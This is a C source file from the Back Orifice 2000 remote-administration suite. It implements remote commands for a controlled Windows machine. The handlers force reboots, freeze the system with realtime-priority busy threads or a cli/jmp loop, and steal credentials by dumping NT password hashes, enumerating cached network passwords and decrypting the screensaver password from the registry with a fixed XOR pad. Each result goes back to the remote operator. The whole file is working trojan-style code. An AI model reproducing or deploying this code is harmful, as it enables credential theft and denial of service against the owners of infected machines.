/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<osversion.h>
#include<functions.h>
#include<auth.h>
#include<iohandler.h>
#include<encryption.h>
#include<commandloop.h>
#include<bocomreg.h>
#include<dumppw.h>
#include<cmd\cmd_system.h>

int CmdProc_SysReboot(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	BOOL bRet;

	bRet=ExitWindowsEx(EWX_FORCE| EWX_REBOOT, 0);
	if(bRet==0) IssueAuthCommandReply(cas_from, comid, 0, "Reboot attempt failed.\n");
	else IssueAuthCommandReply(cas_from, comid, 0, "Rebooting now.\n");

	return 0;
}

DWORD WINAPI LockThread(LPVOID param)
{
	while(1);
	return 0;
}

int CmdProc_SysLockup(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	IssueAuthCommandReply(cas_from,comid,0,"Locking up machine\n[Don't expect much to work after this!]\n");
	Sleep(2000);
	
	if(g_bIsWinNT) {
		SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
		while(1) {
			DWORD dwTid;
			HANDLE hThread=CreateThread(NULL,0,LockThread,NULL,0,&dwTid);
			SetThreadPriority(hThread,THREAD_PRIORITY_TIME_CRITICAL);
		}

	} else {
lockpoint:
		__asm {
			cli
			jmp lockpoint
		}
	}
		
	return 0;
}

#pragma pack(push,1)
typedef struct {
	char *pBuffer;
	int nBufLen;
	int nBufPos;
} PASSCACHECALLBACK_DATA;
#pragma pack(pop)	


BOOL PASCAL PassCacheCallback(struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData)
{
	char buff[1024];
	char buff2[1024];
	int nCount;

	PASSCACHECALLBACK_DATA *dat;
	dat = (PASSCACHECALLBACK_DATA *)dwRefData;
	
	nCount=pce->cbResource;
	if(nCount>1023) nCount=1023;
	memmove(buff, pce->abResource, nCount);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	nCount=pce->cbPassword;
	if(nCount>1023) nCount=1023;
	memmove(buff, pce->abResource+pce->cbResource, nCount);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	return TRUE;
}




int CmdProc_SysListPasswords(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[512];
	DWORD dwBufSize;
	char svReply[512];
	
	if (g_bIsWinNT) {
	
		// PWDump style password dumping
		DumpPasswordHashes(cas_from,comid);		

	} else {
		
		// Return passwords from password cache
		
		IssueAuthCommandReply(cas_from,comid,1,"Passwords cached by system:\n");
			
		PASSCACHECALLBACK_DATA dat;
		dat.pBuffer=(char *)malloc(65536);
		dat.nBufLen=65536;
		dat.nBufPos=0;
		
		pWNetEnumCachedPasswords(NULL, 0, 0xff, PassCacheCallback, (DWORD) &dat);
		
		IssueAuthCommandReply(cas_from,comid,1,"Cached Passwords:\n");
		
		char *svStr;
		svStr=dat.pBuffer;

		while(*svStr!='\0') {
			char *svRsc=svStr;
			svStr+=lstrlen(svStr)+1;
			char *svPwd=svStr;
			svStr+=lstrlen(svStr)+1;
		
			char svBuff[1024];
			wsprintf(svBuff, "Resource: '%.256s'  Password: '%.256s'\n", svRsc, svPwd);
			IssueAuthCommandReply(cas_from,comid,1,svBuff);
		}
		
		free(dat.pBuffer);

		IssueAuthCommandReply(cas_from,comid,1,"End of cached passwords.\n");
		
		// Return screen saver password

		char *regpws[5] = { ".Default", "Control Panel", "desktop", "" };

		HKEY key=HKEY_USERS,key2;
		int l;
		DWORD indx=0;
		while(regpws[indx][0]) {
			l=RegOpenKeyEx(key, regpws[indx], 0, KEY_READ, &key2) ;
			if(key!=HKEY_USERS) RegCloseKey(key);

			if(l!=ERROR_SUCCESS) {
				lstrcpy(svReply,"There is no screensaver password.\n");
				goto exitssavepw;
			}

			key = key2;
			indx++;
		}

		dwBufSize=512;
		if(RegQueryValueEx(key, "ScreenSave_Data", NULL, NULL, (BYTE *)svBuffer, &dwBufSize)!=ERROR_SUCCESS) {
			lstrcpy(svReply, "Unable to read value 'ScreenSave_Data'.\n");
		} else {
			// decode hex chars
			for (indx = 0; indx < dwBufSize/2; indx++) {
				char c1,c2;
				
				c1=svBuffer[indx*2];
				if(c1>='A' && c1<='F') c1=(c1-'A')+0xA;
				else if(c1>='a' && c1<='f') c1=(c1-'a')+0xA;
				else if(c1>='0' && c1<='9') c1=c1-'0';

				c2=svBuffer[indx*2+1];
				if(c2>='A' && c2<='F') c2=(c2-'A')+0xA;
				else if(c2>='a' && c2<='f') c2=(c2-'a')+0xA;
				else if(c2>='0' && c2<='9') c2=c2-'0';
				
				svBuffer[indx] = (c1<<4) | c2;
			}
			
			// xor with pad
			unsigned char xorpattern[60] = {0x48, 0xEE, 0x76, 0x1D, 0x67, 0x69, 0xA1, 0x1B, 
				                            0x7A, 0x8C, 0x47, 0xF8, 0x54, 0x95, 0x97, 0x5F,
											0x78, 0xd9, 0xda, 0x6c, 0x59, 0xd7, 0x6B, 0x35,
											0xC5, 0x77, 0x85, 0x18, 0x2A, 0x0E, 0x52, 0xFF,
											0x00, 0xE3, 0x1B, 0x71, 0x8D, 0x34, 0x63, 0xEB,
											0x91, 0xC3, 0x24, 0x0F, 0xB7, 0xC2, 0xF8, 0xE3,
											0xB6, 0x54, 0x4C, 0x35, 0x54, 0xE7, 0xC9, 0x49,
											0x28, 0xA3, 0x85, 0x11};

			DWORD len;
			len=dwBufSize/2;
			if(len>60) len=60;
			for	(indx = 0; indx < len; indx++) {
				svBuffer[indx] ^= xorpattern[indx];
			}
			svBuffer[len] = '\0';
			
			wsprintf(svReply, "ScreenSaver password: '%s'\n", svBuffer);
		}
		
		RegCloseKey(key);

exitssavepw:

		IssueAuthCommandReply(cas_from, comid,0,svReply);

	}
		
	return 0;
}

int CmdProc_SysViewConsole(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	return -1;
}

int CmdProc_SysInfo(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[512];
	DWORD dwBufSize;
	char svReply[512];
	
	// Send back computer name

	dwBufSize = MAX_COMPUTERNAME_LENGTH+1;
	if(GetComputerName(svBuffer, &dwBufSize)==FALSE) {
		IssueAuthCommandReply(cas_from,comid,1,"Could not retrieve machine name.\n");
	} else {
		wsprintf(svReply, "System info for machine '%.400s'\n", svBuffer);
		IssueAuthCommandReply(cas_from,comid,1,svReply);
	}

	// Send back currently logged in user name
		
	dwBufSize = 512;
	if(GetUserName(svBuffer, &dwBufSize)==FALSE) {
		IssueAuthCommandReply(cas_from,comid,1,"Could not retrieve user name.\n");
	} else {
		wsprintf(svReply, "Current user: '%.400s'\n", svBuffer);
		IssueAuthCommandReply(cas_from,comid,1,svReply);
	}
	
	// Send back processor info
	
	SYSTEM_INFO sysInfo;

	lstrcpy(svReply, "Processor: ");
	
	GetSystemInfo(&sysInfo);
	switch (sysInfo.dwProcessorType) {
	case PROCESSOR_INTEL_386:
		lstrcat(svReply, "I386\n");
		break;
	case PROCESSOR_INTEL_486:
		lstrcat(svReply, "I486\n");
		break;
	case PROCESSOR_INTEL_PENTIUM:
		lstrcat(svReply, "I586\n");
		break;
	case PROCESSOR_MIPS_R4000:
		lstrcat(svReply, "MIPSR4000\n");
		break;
	default:
		lstrcat(svReply, "UNKNOWN\n");
		break;
	}
	
	IssueAuthCommandReply(cas_from,comid,1,svReply);

	// Send back OS version info
	
	OSVERSIONINFO osvi;

	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if (GetVersionEx(&osvi) == FALSE) {
		lstrcpy(svReply, "Could not get version info.\n");
	} else {
		switch(osvi.dwPlatformId) {
		case VER_PLATFORM_WIN32s:       
			lstrcpy( svBuffer, "Win32s on Windows 3.1");
			break;
		case VER_PLATFORM_WIN32_WINDOWS:
			lstrcpy( svBuffer, "Win32 on Windows 95");
			break;
		case VER_PLATFORM_WIN32_NT:
			lstrcpy( svBuffer, "Windows NT");
			break;
		default:
			lstrcpy( svBuffer, "Windows?");
			break;
		}
		wsprintf( svReply, "%s v%d.%d build %d\n", svBuffer, (int)osvi.dwMajorVersion, (int)osvi.dwMinorVersion, (int)LOWORD(osvi.dwBuildNumber));
		if(lstrlen(osvi.szCSDVersion)) {
			lstrcat(svReply, " - ");
			lstrcat(svReply, osvi.szCSDVersion);
			lstrcat(svReply, "\n");
		}
	}
	IssueAuthCommandReply(cas_from,comid,1,svReply);
	
	// Send back global memory usage
	MEMORYSTATUS memstat;
	DWORD dw,dw2,dw3,dw4;
	char c;
	int x;

	memstat.dwLength = sizeof(memstat);

	GlobalMemoryStatus(&memstat);
	wsprintf(svReply, "Memory: %dM in use: %d%%  Page file: %dM free: %dM\n", memstat.dwTotalPhys/1024/1024, memstat.dwMemoryLoad, memstat.dwTotalPageFile/1024/1024, memstat.dwAvailPageFile/1024/1024 );
	IssueAuthCommandReply(cas_from,comid,1,svReply);
	
	for (c = 'C'; c <= 'Z'; c++) {
		wsprintf(svReply, "%c:\\", c);
		x = GetDriveType(svReply);
		lstrcat( svReply, " - ");
		switch (x) {
		case 0:
			lstrcat(svReply, "Unable to determine.\n");
			break;
		case 1:
			svReply[0]='\0';
			break;
		case DRIVE_REMOVABLE:
			lstrcat(svReply, "Removable\n");
			break;
		case DRIVE_FIXED:
			lstrcat(svReply, "Fixed");
			wsprintf(svBuffer, "%c:\\", c);
			if (GetDiskFreeSpace(svBuffer, &dw, &dw2, &dw3, &dw4)) {
				wsprintf(svBuffer, " Sec/Clust: %u Byts/Sec: %u,  Bytes free: %u/%u\n", (unsigned int)dw, (unsigned int)dw2, (unsigned int)(dw3*dw2*dw), (unsigned int)(dw4*dw2*dw));
				lstrcat(svReply, svBuffer);
			} else lstrcat(svReply,"\n");
			break;
		case DRIVE_REMOTE:
			lstrcat(svReply, "Remote\n");
			break;
		case DRIVE_CDROM:
			lstrcat(svReply, "CD-ROM\n");
			break;
		case DRIVE_RAMDISK:
			lstrcat(svReply, "Ramdisk\n");
			break;
		default:
			lstrcat(svReply, "Unknown type!\n");
			break;
		}
		if(lstrlen(svReply))
			IssueAuthCommandReply(cas_from,comid,1,svReply);
	}
	
	IssueAuthCommandReply(cas_from,comid,0,"End of system info\n");
	
	return 0;
}
	
